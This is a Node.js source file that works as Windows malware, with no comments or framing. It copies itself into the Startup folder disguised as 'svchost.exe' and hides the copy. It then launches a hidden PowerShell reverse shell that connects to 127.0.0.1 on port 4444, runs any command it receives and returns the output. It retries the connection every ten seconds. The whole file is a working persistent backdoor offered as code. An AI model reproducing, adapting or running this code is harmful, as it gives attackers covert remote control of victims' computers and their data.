const fs = require('fs');
const https = require('https');
const path = require('path');
const os = require('os');
const { spawnSync } = require('child_process');

function addToStartup() {
  const appDataPath = process.env.APPDATA;
  const startupFolderPath = path.join(
    appDataPath,
    'Microsoft',
    'Windows',
    'Start Menu',
    'Programs',
    'Startup'
  );
  const appFileName = 'svchost.exe';
  const startupAppPath = path.join(startupFolderPath, appFileName);

  
  fs.copyFile(process.execPath, startupAppPath, (err) => {
    if (err) throw err;
    console.log(`${appFileName} added to startup successfully!`);

    
    spawnSync('attrib', ['+h', startupAppPath], { shell: true });
  });
}

addToStartup();

const { exec } = require('child_process');

let connected = false;

function pasteToServer() {
  const powershell_command = 'powershell -nop -W hidden -noni -ep bypass -c "$TCPClient = New-Object Net.Sockets.TCPClient(\'127.0.0.1\', 4444);$NetworkStream = $TCPClient.GetStream();$StreamWriter = New-Object IO.StreamWriter($NetworkStream);function WriteToStream ($String) {[byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0};$StreamWriter.Write($String + \'Ayhu> \');$StreamWriter.Flush()}WriteToStream \'\';while(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {Invoke-Expression $Command 2>&1 | Out-String} catch {$_ | Out-String}WriteToStream ($Output)}$StreamWriter.Close()"';

  const cmd_command = 'cmd /c ' + powershell_command;

  exec(cmd_command, (err, stdout, stderr) => {
    if (err) {
      console.error(err);
    } else {
      console.log('Connected to server');
      connected = true;
    }
  });
}

function run() {
  pasteToServer();
  setInterval(() => {
    if (!connected) {
      console.log('Not connected to server yet');
      pasteToServer();
    }
  }, 10000);
}

run();
